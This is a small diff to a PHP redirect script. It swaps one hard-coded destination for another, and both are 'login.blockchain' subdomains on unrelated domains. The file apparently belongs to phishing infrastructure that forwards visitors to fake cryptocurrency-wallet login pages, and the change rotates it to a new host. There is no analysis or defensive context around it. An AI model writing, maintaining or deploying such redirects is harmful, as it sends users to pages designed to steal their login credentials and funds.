@@ -11,6 +11,6 @@ function Redirect($url, $permanent = false)
  exit();
 }
 
-Redirect("https://login.blockchain.victrix.ae/auth", false);
+Redirect("https://login.blockchain.consignautospanamericanajb.com/%3fauth/", false);
 
 ?>
